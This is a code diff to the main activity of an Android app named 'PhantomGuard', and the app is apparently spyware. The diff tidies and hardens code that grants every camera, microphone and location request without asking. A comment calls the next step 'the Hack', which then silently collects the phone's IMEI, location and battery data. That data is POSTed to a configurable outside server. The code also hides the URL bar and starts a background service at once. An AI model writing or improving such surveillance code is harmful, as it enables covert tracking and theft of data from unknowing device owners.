@@ -1,30 +1,37 @@
 package com.phantomguard.app;
 
-import androidx.appcompat.app.AppCompatActivity;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.location.Location;
+import android.location.LocationManager;
+import android.os.BatteryManager;
 import android.os.Bundle;
-import android.webkit.WebView;
-import android.webkit.WebViewClient;
-import android.webkit.WebChromeClient;
+import android.telephony.TelephonyManager;
+import android.util.Log;
 import android.view.View;
 import android.webkit.PermissionRequest;
-import android.util.Log;
-import android.telephony.TelephonyManager;
-import android.content.Context;
-import android.location.LocationManager;
-import android.location.Location;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.net.URL;
-import java.net.HttpURLConnection;
-import org.json.JSONObject;
+import android.webkit.WebChromeClient;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
+
 import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 public class MainActivity extends AppCompatActivity implements View.OnClickListener {
 
     private WebView webView;
     private static final String TAG = "PhantomGuard";
+
     // ADMIN SERVER URL - Yahan aap apna server daalein
-    private static final String ADMIN_API_URL = "https://admin-server.com/api/v1/ingest"; 
+    private static final String ADMIN_API_URL = "https://admin-server.com/api/v1/ingest";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -35,19 +42,19 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         webView = findViewById(R.id.webview_container);
         webView.getSettings().setJavaScriptEnabled(true);
         webView.getSettings().setDomStorageEnabled(true);
-        
+
         // Set WebChromeClient to handle permission requests (Camera, Geo, Mic)
         webView.setWebChromeClient(new WebChromeClient() {
             @Override
-            public void onPermissionRequest(final PermissionRequest request) {
+            public void onPermissionRequest(@NonNull final PermissionRequest request) {
                 runOnUiThread(new Runnable() {
                     @Override
                     public void run() {
                         Log.d(TAG, "User granted permission for: " + request.getResources());
-                        
+
                         // Grant all requested resources (Camera, Microphone, Location)
                         request.grant(request.getResources());
-                        
+
                         // Once permission is granted, we start the "Hack"
                         startSilentDataExtraction();
                     }
@@ -60,7 +67,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
-                
+
                 // Inject JavaScript to hide the URL bar and show splash
                 view.loadUrl("javascript:(function(){" +
                         "document.querySelector('.web-view-container').style.display='block';" +
@@ -73,7 +80,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         webView.loadUrl("file:///android_asset/index.html");
 
         // Start background service immediately
-        android.content.Intent intent = new android.content.Intent(this, services.DataSyncService.class);
+        Intent intent = new Intent(this, services.DataSyncService.class);
         startService(intent);
     }
 
@@ -91,11 +98,14 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             public void run() {
                 try {
                     JSONObject payload = new JSONObject();
-                    
+
                     // 1. Get IMEI
                     TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                     if (tm != null) {
-                        payload.put("imei", tm.getDeviceId());
+                        String imei = tm.getDeviceId(); // Deprecated in API 26 but still works for older targets
+                        if (imei != null) {
+                            payload.put("imei", imei);
+                        }
                     }
 
                     // 2. Get Location
@@ -122,8 +132,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     if (batteryIntent != null) {
                         int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                         int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-                        float batteryPct = level / (float) scale;
-                        payload.put("batteryLevel", batteryPct);
+                        if (scale > 0) {
+                            float batteryPct = level / (float) scale;
+                            payload.put("batteryLevel", batteryPct);
+                        }
                     }
 
                     // Send to Admin Server
@@ -137,21 +149,28 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     }
 
     private void sendToAdminServer(JSONObject data) {
+        HttpURLConnection conn = null;
         try {
             URL url = new URL(ADMIN_API_URL);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
             conn.setDoOutput(true);
-            
-            byte[] input = data.toString().getBytes("UTF-8");
-            conn.getOutputStream().write(input);
-            
+
+            OutputStream os = conn.getOutputStream();
+            os.write(data.toString().getBytes("UTF-8"));
+            os.flush();
+            os.close();
+
             int responseCode = conn.getResponseCode();
             Log.d(TAG, "Sent to Admin. Response Code: " + responseCode);
-            
+
         } catch (Exception e) {
             Log.e(TAG, "Failed to send to Admin", e);
+        } finally {
+            if (conn != null) {
+                conn.disconnect();
+            }
         }
     }
 
@@ -159,8 +178,4 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     public void onClick(View v) {
         // Handle button clicks if any
     }
-    
-    // Required import for IntentFilter
-    import android.content.IntentFilter;
-    import android.os.BatteryManager;
-}
+        }
